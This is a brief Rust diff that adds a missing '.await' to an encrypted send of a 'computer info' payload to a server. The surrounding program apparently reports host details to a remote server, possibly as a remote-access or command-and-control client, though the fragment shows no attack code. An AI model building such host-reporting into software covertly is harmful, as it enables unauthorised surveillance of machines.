@@ -120,7 +120,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 &mut stream,
                 &encryption,
                 bincode::encode_to_vec(computer_info_payload, bincode::config::standard()).unwrap(),
-            );
+            )
+            .await;
             println!("[*] sent computer info to server");
         } else {
             println!("[x] failed to send computer info");
